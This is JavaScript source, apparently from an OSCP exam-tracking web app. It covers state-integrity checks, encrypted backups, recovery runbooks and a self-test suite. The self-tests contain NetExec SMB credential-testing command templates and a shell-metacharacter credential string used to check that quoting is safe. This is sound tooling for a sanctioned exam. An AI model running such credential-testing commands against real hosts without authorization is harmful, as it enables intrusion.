 const issues=v15StateIssues(),crit=issues.filter(x=>x.p===0).length,warn=issues.filter(x=>x.p===1).length;$('#v15IntegritySummary').innerHTML=`<b>${issues.length}</b> issue(s) · <span class="v15Fail">${crit} critical</span> · ${warn} warning`;
 $('#v15IntegrityList').innerHTML=issues.length?issues.slice(0,30).map(x=>`<div class="v15Issue p${x.p}"><b>P${x.p} ${esc(x.title)}</b><div class="v15Tiny">${esc(x.why)}</div></div>`).join(''):'<div class="v15Issue ok"><b>No state-integrity issue detected.</b></div>';
 const t=activeTarget(),st=$('#v15StaleState');if(t){const si=v15StaleItems(t);st.innerHTML=si.length?`<div class="v15Stale"><b>${esc(targetLabel(t))} · epoch ${t.revertEpoch||0} · REVALIDATE</b>${si.map(x=>`<div>⚠ ${esc(x)}</div>`).join('')}</div>`:`<div class="v15Stale live"><b>${esc(targetLabel(t))} · live state current for epoch ${t.revertEpoch||0}</b></div>`;$('#v15MarkRevalidated').disabled=!si.length;
  const act=v15ScoreActions(t);$('#v15ScoredActions').innerHTML=act.length?act.map(a=>`<div class="v15Score"><div class="v15ScoreNum">${a.score}</div><div><b>${esc(a.title)}</b><div class="v15Tiny">${esc(a.why||'')}</div><div class="v15Components">${esc((a.parts||[]).join(' · '))}</div></div></div>`).join(''):'<div class="muted">No action scored yet.</div>';
  const d=v15Debt(t);$('#v15DebtMetrics').innerHTML=Object.entries(d).map(([k,v])=>`<div class="v15DebtBox"><div class="v15Metric">${v}</div><div class="v15Tiny">${esc(k)}</div></div>`).join('');const total=Object.values(d).reduce((a,b)=>a+b,0);$('#v15DebtAdvice').textContent=total?`${total} unfinished obligation(s). Clear evidence and credential debt before low-signal research.`:'No deterministic attention debt detected for the active target.';
  const rg=v15ReproItems(t);$('#v15ReproGate').innerHTML=rg.map(x=>`<div class="closureItem ${x.ok?'ok':'miss'}">${x.ok?'✅':'❌'} ${esc(x.l)}</div>`).join('');
 }else{st.textContent='No active target.';$('#v15ScoredActions').textContent='No active target.';$('#v15DebtMetrics').innerHTML='';$('#v15ReproGate').textContent='No active target.'}
}
function renderV16Chain(){const t=activeTarget();const s=$('#v15ChainTarget');if(s){s.innerHTML=targets.map(x=>`<option value="${esc(x.id)}">${esc(targetLabel(x))}</option>`).join('')||'<option>No targets</option>';s.value=t?.id||''}if(!t)return;const c=v15Chain(t);for(const k of V16_CHAIN_KEYS){const el=$('#v15Chain'+k[0].toUpperCase()+k.slice(1));if(el)el.value=c[k]||''}$('#v15ChainBanked').checked=!!c.banked;const checks=v15ChainChecks(t);$('#v15ChainStatus').innerHTML=checks.map(x=>`<div class="v15ChainStatus ${x.ok?'ok':'miss'}">${x.ok?'✅':'❌'} ${esc(x.label)}</div>`).join('');$('#v15ChainRepro').innerHTML=v15ReproItems(t).map(x=>`<div class="closureItem ${x.ok?'ok':'miss'}">${x.ok?'✅':'❌'} ${esc(x.l)}</div>`).join('')}
function renderV16(){renderV16Reliability();renderV16Chain();renderSimplePointProtection();renderSimpleRiskStrip();renderCaptureCommand(false)}

const v16PointSetActiveBase=setActiveTarget;setActiveTarget=function(id){v16PointSetActiveBase(id);renderSimplePointProtection();renderSimpleRiskStrip();renderCaptureCommand(false)};
const v16SaveOpsBase=saveOps;saveOps=function(){v16SaveOpsBase();renderSimpleRiskStrip()};
const v16SnapshotNowBase=snapshotNow;snapshotNow=function(reason='manual'){const ok=v16SnapshotNowBase(reason);renderSimpleRiskStrip();return ok};
for(const id of ['capturePlatform','captureKind']){const e=$('#'+id);if(e)e.onchange=()=>renderCaptureCommand(true)}
if($('#capturePath'))$('#capturePath').oninput=()=>renderCaptureCommand(false);
if($('#copyCaptureCommand'))$('#copyCaptureCommand').onclick=async()=>await guardedCopyText($('#captureCommand').textContent,'Proof command');
if($('#copyCaptureFilename'))$('#copyCaptureFilename').onclick=async()=>toast(await copyText($('#captureFilename').textContent)?'Screenshot filename copied':'Copy blocked');
if($('#simpleRiskOpen'))$('#simpleRiskOpen').onclick=openHighestRisk;
if($('#simpleSnapshotNow'))$('#simpleSnapshotNow').onclick=()=>{snapshotNow('simple start');toast('Secret-free recovery point created')};
const v23PreRevertSnapshot=$('#v23PreRevertSnapshot');if(v23PreRevertSnapshot)v23PreRevertSnapshot.onclick=()=>{const t=activeTarget();snapshotNow(`pre-revert ${t?targetLabel(t):'current target'}`);toast('Pre-revert recovery point saved')};

$('#v15RefreshIntegrity').onclick=renderV16Reliability;
$('#v15PreviewRepair').onclick=()=>{const r=v15SafeRepairPreview();alert(r.length?'Safe repair preview:\n\n- '+r.join('\n- '):'No safe repair is currently needed. The app will not delete or guess ambiguous data.')};
$('#v15ApplyRepair').onclick=v15ApplySafeRepair;
$('#v15ExportDiagnostic').onclick=()=>downloadText('OSCP-state-diagnostic.json',JSON.stringify({generated:new Date().toISOString(),app:'OSCP-V19',issues:v15StateIssues(),stats:{targets:targets.length,credentials:credentials.length,evidence:evidenceVault.length},activeTargetId},null,2),'application/json');
$('#v15MarkRevalidated').onclick=()=>v15Revalidate(activeTarget());
$('#v15ChainTarget').onchange=e=>{setActiveTarget(e.target.value);renderV16Chain();renderV16Reliability()};
$('#v15SeedChain').onclick=()=>{v15SeedChainFromState(activeTarget());renderV16Chain()};
$('#v15SaveChain').onclick=()=>{const t=activeTarget();if(!t)return;const c=v15Chain(t);for(const k of V16_CHAIN_KEYS){const el=$('#v15Chain'+k[0].toUpperCase()+k.slice(1));c[k]=el.value.trim()}c.banked=$('#v15ChainBanked').checked;saveTargets();renderV16Chain();toast('Causal chain saved')};
$('#v15OpenReport').onclick=()=>{switchView('reportsView');renderReport()};

$('#v15RunBackupTest').onclick=async()=>{const f=$('#v15BackupTestFile').files[0],box=$('#v15BackupTestResult');if(!f){box.innerHTML='<div class="v15Issue p0">Choose a backup JSON file.</div>';return}try{assertImportFileSize(f,'Backup');let o=JSON.parse(await f.text());if(o?.ciphertext){const pass=$('#v15BackupTestPass').value;if(!pass)throw new Error('Encrypted backup: enter the passphrase');o=await decryptPayload(o,pass)}const r=v15BackupValidate(o);box.innerHTML=`<div class="v15Issue ${r.ok?'ok':'p0'}"><b>${r.ok?'PASS — backup decrypted/parsed and schema is usable':'FAIL — backup is not safely restorable'}</b><div class="v15Tiny">${esc(JSON.stringify(r.stats||{}))}</div>${r.issues.map(x=>`<div>❌ ${esc(x)}</div>`).join('')}</div>`}catch(e){box.innerHTML=`<div class="v15Issue p0"><b>FAIL</b><div class="v15Tiny">${esc(e.message)}</div></div>`}};

/* V19 encryption label while retaining backward restore compatibility. */
const v15EncryptPayloadBase=encryptPayload;encryptPayload=async function(obj,pass){const x=await v15EncryptPayloadBase(obj,pass);x.format='OSCP-V19-AESGCM';x.app='OSCP-V19';return x};
const v15DecryptPayloadBase=decryptPayload;decryptPayload=async function(container,pass){if(container?.format==='OSCP-V19-AESGCM'||container?.format==='OSCP-V16-AESGCM'||container?.format==='OSCP-V15-AESGCM'){container={...container,format:'OSCP-V10-AESGCM'}}return v15DecryptPayloadBase(container,pass)};
$('#exportEncrypted').onclick=async()=>{const pass=$('#encPassphrase').value;if(pass.length<8){alert('Use a passphrase of at least 8 characters.');return}try{const obj=await encryptPayload(sessionPayload($('#encIncludeSecrets').checked),pass);downloadText('oscp-encrypted-backup.json',JSON.stringify(obj,null,2),'application/json');toast('Encrypted backup exported')}catch(e){alert('Encryption failed: '+e.message)}};

const V16_RUNBOOKS={
 'VPN / routing':`1. Confirm tun0 exists and has the expected address.\n2. Check ip route and the exam subnet route.\n3. Test one known target by IP.\n4. Separate VPN failure from DNS failure.\n5. If connectivity/target infrastructure is broken, record timestamp + symptoms and contact the proctor/support immediately.\n6. Do not change the attack hypothesis until the network layer is proven.`,
 'Kerberos / AD auth':`1. Resolve the domain/DC correctly.\n2. Compare attacker time with the DC; fix clock skew.\n3. Confirm FQDN / realm / SPN spelling.\n4. Confirm credential format and account scope.\n5. Confirm 88/389/445 reachability.\n6. Re-run one minimal authentication check before changing tools.`,
 'Target changed / revert':`1. Check the Revert Ledger and current target epoch.\n2. Treat shell, tunnel, uploads, service/task edits and temporary sessions as stale.\n3. Re-establish the original foothold from your recorded steps.\n4. Revalidate the exact privilege/configuration prerequisite.\n5. Mark live state revalidated only after proving it.\n6. Banked historical screenshots/proof remain evidence; live-state assumptions do not.`,
 'Tool suddenly broken':`1. Inspect the exact error/output.\n2. Sanitize smart quotes/dashes/hidden characters.\n3. Run local -h/--help and --version.\n4. Verify IP/hostname/user/domain/LHOST and route.\n5. If the hypothesis remains strong, try ONE alternate implementation/manual validation.\n6. If both implementations fail on the same prerequisite, kill/park the hypothesis.`,
 'Console / session failure':`1. Do not clear browser storage.\n2. Test the newest encrypted/session backup without restoring.\n3. Inspect Autosnapshots and Session Health.\n4. Export any readable current state before recovery.\n5. Restore only after the backup integrity check confirms the schema is usable.\n6. Run State Integrity Doctor and Functional Self-Test after restore.`,
 'Evidence / report failure':`1. Stop attacking once passing points depend on this evidence.\n2. Confirm proof came from original location in an interactive shell.\n3. Confirm target IP is visible in screenshot.\n4. Confirm proof value was submitted before attack end.\n5. Run evidence-file audit against the actual evidence directory.\n6. Run the reproduction gate and Submission Gate; use 7z l to verify archive contents, compare the upload-site MD5 with local md5sum, then click Submit File.`
};
function renderV16Disaster(){const root=$('#v15DisasterButtons');root.innerHTML=Object.keys(V16_RUNBOOKS).map(k=>`<button class="btn v15RunbookBtn" data-runbook="${esc(k)}"><b>${esc(k)}</b><br><span class="tiny">Open deterministic recovery</span></button>`).join('');$$('.v15RunbookBtn').forEach(b=>b.onclick=()=>{$('#v15RunbookTitle').textContent=b.dataset.runbook;$('#v15Runbook').textContent=V16_RUNBOOKS[b.dataset.runbook]})}

/* V19 functional self-tests: pure/deterministic and restore global arrays after each test. */
const V16_SELF_TESTS=[
 ['Storage namespace remains backward-compatible',()=>[STORE==='oscp_v16_',STORE]],
 ['Target upgrade initializes reliability chain',()=>{const t=upgradeV16Target({id:'x',status:{},signals:[],path:[],findings:[],timeline:[]});return[!!t.v15?.chain,'chain='+!!t.v15?.chain]}],
 ['Integrity catches duplicate target IDs',()=>{const x=v15StateIssuesFor({targets:[{id:'a',status:{},path:[],findings:[]},{id:'a',status:{},path:[],findings:[]}],credentials:[],evidenceVault:[],activeTargetId:'a'});return[x.some(i=>i.title==='Duplicate target IDs'),x.map(i=>i.title).join('|')]}],
 ['Integrity catches orphan credential',()=>{const x=v15StateIssuesFor({targets:[{id:'a',status:{},path:[],findings:[]}],credentials:[{user:'u',sourceTarget:'z'}],evidenceVault:[],activeTargetId:'a'});return[x.some(i=>i.title==='Orphan credential source'),x.map(i=>i.title).join('|')]}],
 ['Backup validator accepts current session schema',()=>{const r=v15BackupValidate({app:'OSCP-V19',version:19,targets:[{id:'a'}],credentials:[],activeTargetId:'a'});return[r.ok,JSON.stringify(r)]}],
 ['Backup validator rejects orphan active target',()=>{const r=v15BackupValidate({version:19,targets:[{id:'a'}],activeTargetId:'z'});return[!r.ok,r.issues.join('|')]}],
 ['Revert stale detector fires',()=>{const t=upgradeV16Target({id:'a',revertEpoch:2,status:{foothold:true},signals:[],path:[],findings:[],timeline:[],v15:{lastRevalidatedEpoch:1,liveStateStale:true}});return[v15StaleItems(t).length>0,v15StaleItems(t).join('|')]}],
 ['Revalidated target clears stale detector',()=>{const t=upgradeV16Target({id:'a',revertEpoch:2,status:{},signals:[],path:[],findings:[],timeline:[],v15:{lastRevalidatedEpoch:2,liveStateStale:false}});return[v15StaleItems(t).length===0,'stale='+v15StaleItems(t).length]}],
 ['Causal chain reports missing links',()=>{const t=upgradeV16Target({id:'a',status:{},signals:[],path:[],findings:[],timeline:[],v15:{chain:{observation:'fact'}}});return[v15ChainChecks(t).filter(x=>!x.ok).length>=5,v15ChainChecks(t).map(x=>`${x.k}:${x.ok}`).join('|')]}],
 ['Evidence closure outranks methodology',()=>{const saved={targets,credentials,evidenceVault,activeTargetId};try{const t=upgradeV16Target({id:'a',ip:'1.2.3.4',role:'linux',status:{foothold:true},signals:['linux-shell'],path:[],findings:[],timeline:[],evidence:{}});targets=[t];credentials=[];evidenceVault=[];activeTargetId='a';const a=v15ScoreActions(t)[0];return[!!a&&a.score>=90,a?`${a.score}:${a.title}`:'none']}finally{targets=saved.targets;credentials=saved.credentials;evidenceVault=saved.evidenceVault;activeTargetId=saved.activeTargetId}}],
 ['Safe repair preview is non-destructive',()=>{const before=JSON.stringify(targets),r=v15SafeRepairPreview();return[JSON.stringify(targets)===before,`preview=${r.length}`]}],
 ['Reproduction gate requires commands',()=>{const t=upgradeV16Target({id:'a',ip:'1.2.3.4',status:{foothold:true},signals:[],path:[],findings:[],timeline:[],report:{title:'x',foothold:'a long enough foothold description',privesc:'',commands:'',screens:'',remediation:''},journal:[],evidence:{}});return[v15ReproItems(t).some(x=>x.l.startsWith('Exact commands')&&!x.ok),v15ReproItems(t).map(x=>`${x.ok?'1':'0'}:${x.l}`).join('|')]}]
 ,['Screenshot filename is target-specific and sanitized',()=>{const x=captureFileName({host:'DC 01 / Lab'},'proof');return[x==='dc-01-lab-proof-original-path.png',x]}]
 ,['Cross-target risk detects unbanked access',()=>{const saved={targets,credentials,autosnapshots};try{targets=[upgradeV16Target({id:'risk',ip:'10.10.10.8',status:{foothold:true},signals:[],path:[],findings:[],timeline:[],evidence:{}})];credentials=[];autosnapshots=[];const r=simpleRiskSummary();return[r.atRiskTargets.length===1&&r.lastSnapshot===0,`atRisk=${r.atRiskTargets.length}, snapshot=${r.lastSnapshot}`]}finally{targets=saved.targets;credentials=saved.credentials;autosnapshots=saved.autosnapshots}}]
 ,['Tool arsenal has broad coverage',()=>[TOOL_ARSENAL.length>=65,`tools=${TOOL_ARSENAL.length}`]]
 ,['Tool arsenal IDs are unique',()=>{const n=new Set(TOOL_ARSENAL.map(x=>x.id)).size;return[n===TOOL_ARSENAL.length,`unique=${n}/${TOOL_ARSENAL.length}`]}]
 ,['Tool cards have required decision fields',()=>{const bad=TOOL_ARSENAL.filter(x=>!x.name||!x.category||!x.tier||!x.trigger||!x.command||!x.fallback);return[bad.length===0,bad.map(x=>x.id).join('|')||'complete']}]
 ,['Shell quoting preserves hostile credential characters',()=>{const raw="pa ss$!;'&()";const q=shQuote(raw);return[q.startsWith("'")&&q.endsWith("'")&&q.includes("'\"'\"'"),q]}]
 ,['Token is never routed to password flags',()=>{const out=credCommands({ip:'10.0.0.1'},{id:'x',user:'u',type:'token',secret:'bearer'},'SMB',[`nxc smb 10.0.0.1 -u {U} -p {P}`]).join('\n');return[!out.includes(' -p ')&&out.includes('not generic OS passwords'),out]}]
 ,['SSH key note is never treated as a key path',()=>{const out=credCommands({ip:'10.0.0.1'},{id:'x',user:'u',type:'SSH key',secret:'PRIVATE KEY MATERIAL'},'SSH',[`ssh {U}@10.0.0.1`]).join('\n');return[!out.includes('PRIVATE KEY MATERIAL')&&out.includes('actual key FILE path'),out]}]
 ,['ccache is routed to Kerberos-aware workflow',()=>{const out=credCommands({ip:'10.0.0.1'},{id:'x',user:'u',type:'ccache',secret:'/tmp/u.ccache'},'SMB',[`nxc smb 10.0.0.1 -u {U} -p {P}`]).join('\n');return[!out.includes(' -p ')&&out.includes('KRB5CCNAME'),out]}]
];
function runV16SelfTests(){const rows=[];for(let i=0;i<V16_SELF_TESTS.length;i++){const [name,fn]=V16_SELF_TESTS[i];try{const [pass,observed]=fn();rows.push({i:i+1,name,pass:!!pass,observed:String(observed||'')})}catch(e){rows.push({i:i+1,name,pass:false,observed:e.name+': '+e.message})}}const pass=rows.filter(x=>x.pass).length,fail=rows.length-pass;window.__v15SelfTestSummary={total:rows.length,pass,fail,rows};$('#v15TestSummary').innerHTML=`<div><b>${rows.length}</b><br><span class="tiny">tests</span></div><div><b class="v15Pass">${pass}</b><br><span class="tiny">pass</span></div><div><b class="v15Fail">${fail}</b><br><span class="tiny">fail</span></div>`;$('#v15TestBody').innerHTML=rows.map(r=>`<tr><td>${r.i}</td><td><b>${esc(r.name)}</b></td><td>${esc(r.observed).slice(0,500)}</td><td class="${r.pass?'v15Pass':'v15Fail'}">${r.pass?'PASS':'FAIL'}</td></tr>`).join('');return window.__v15SelfTestSummary}
$('#runV16SelfTests').onclick=runV16SelfTests;

/* Session payload/restore final V19 wrapper. */
const v15SessionBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=v15SessionBase(includeSecrets);o.app='OSCP-V19';o.version=16;o.ruleSnapshot=V16_RULE_VERIFIED;return o};
const v15RestoreBase=restoreV9Payload;restoreV9Payload=function(o){v15RestoreBase(o);targets=targets.map(upgradeV16Target);saveTargets();renderV16()};

/* Switch/render integration. */
const v15SwitchBase=switchView;switchView=function(id){v15SwitchBase(id);if(id==='v15ReliabilityView')renderV16Reliability();if(id==='v15ChainView')renderV16Chain();if(id==='v15DisasterView')renderV16Disaster();if(id==='v15SelfTestView'){} };
const v15RenderRevertsBase=renderReverts;renderReverts=function(){v15RenderRevertsBase();renderV16Reliability()};

renderV16Disaster();renderV16();
